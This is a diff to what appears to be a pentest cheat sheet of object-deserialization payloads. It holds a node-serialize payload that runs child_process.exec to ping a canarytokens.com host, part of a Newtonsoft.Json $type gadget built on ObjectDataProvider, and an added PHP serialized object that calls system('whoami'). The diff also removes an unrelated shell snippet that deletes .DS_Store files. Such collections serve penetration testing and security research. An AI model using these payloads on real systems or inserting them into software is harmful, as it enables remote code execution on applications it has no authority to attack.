@@ -1,12 +1,12 @@
 # Object Deserialization
-## Node.JS node-serialize
+## Node.JS - node-serialize
 ```sh
 {"rce":"_$$ND_FUNC$$_function() {require('child_process').exec('ping XXXXXXXXX.canarytokens.com', (error, stdout, stderr) => { console.log(stdout); }); } ()"}
 
 ```
 #####
 
-## C# Newtonsoft
+## C# - Newtonsoft
 ```sh
 {
     '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
@@ -20,12 +20,9 @@
 ```
 #####
 
-## Find and delete files
+## PHP - serialize
 ```sh
-#!/bin/sh
-
-find . -name ".DS_Store*" -print 2>/dev/null |  xargs rm 
-
+O:8:"Example2":1:{s:14:"Example2hook";s:17:"system('whoami');";} 
 ```
 #####
 
